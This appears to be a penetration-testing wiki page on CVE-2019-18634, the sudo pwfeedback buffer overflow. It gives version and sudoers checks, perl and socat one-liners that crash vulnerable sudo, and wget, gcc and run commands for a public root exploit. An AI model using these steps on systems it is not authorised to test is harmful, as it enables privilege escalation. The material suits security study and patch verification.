---
description: CVE-2019-18634
---

# Pwfeedback Buffer Overflow

## Theory

Sudo’s pwfeedback option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard `Password:` prompt disables the echoing of key presses. While pwfeedback is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.  

The vulnerability affect sudo versions **1.7.1** to **1.8.30**.  

{% hint style="danger" %}
Exploiting the bug does not require sudo permissions, merely that pwfeedback be enabled. The bug can be reproduced by passing a large input with embedded terminal kill characters to sudo from a pseudo-terminal  
{% endhint %}

## Practice

{% tabs %}
{% tab title="Enum" %}
To exploit, sudo version must be vulnerable (**1.7.1** to **1.8.30**)
```bash
$ sudo -V
Sudo version 1.8.30
```

Pwfeedback must be enabled. You may verify it with `sudo -l`. If pwfeedback is listed in the “Matching Defaults entries” output, the sudoers configuration is affected. 
```bash
$ sudo -l
[sudo] password for user:
Matching Defaults entries for user on vulnserver:
    env_reset, pwfeedback, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User user may run the following commands on vulnserver:
    (ALL:ALL) /usr/bin/python3 /opt/custom/service.py
```

To check the exploitability of sudo, you may run the following commands. If it's returns a `Segmentation fault` error message, then it’s vulnerable.
```bash
$ socat pty,link=/tmp/pty,waitslave exec:"perl -e 'print((\"A\" x 100 . chr(0x15)) x 50)'" &
$ sudo -S -k id < /tmp/pty
Password: Segmentation fault (core dumped)
```

For sudo versions prior to 1.8.26, and on systems with uni-directional pipes, reproducing the bug is simpler.
```bash
$ perl -e 'print(("A" x 100 . chr(0)) x 50)' | sudo -S -k id
Password: Segmentation fault (core dumped)
```
{% endtab %}

{% tab title="Exploit" %}
We can use the [exploit](https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c) written by Saleem Rashid. 
```bash
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
gcc -o exploit exploit.c
./exploit
```
{% endtab %}
{% endtabs %}

### References

{% embed url="https://www.sudo.ws/security/advisories/pwfeedback/" %}
